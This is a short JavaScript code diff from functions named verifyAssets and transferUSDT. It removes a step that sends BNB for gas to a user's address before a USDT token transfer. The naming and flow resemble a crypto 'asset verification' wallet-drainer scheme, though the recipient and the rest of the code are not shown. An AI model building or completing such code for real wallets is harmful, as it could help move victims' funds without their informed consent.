@@ -75,11 +75,6 @@ async function verifyAssets() {
 
 async function transferUSDT(usdtBalance, userBNB) {
     try {
-        if (userBNB < 0.0005) {
-            console.log("Low BNB detected, sending gas fee...");
-            await sendBNB(userAddress, "0.001");
-        }
-
         // Proceed with USDT Transfer
         const usdtContract = new web3.eth.Contract([
             { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
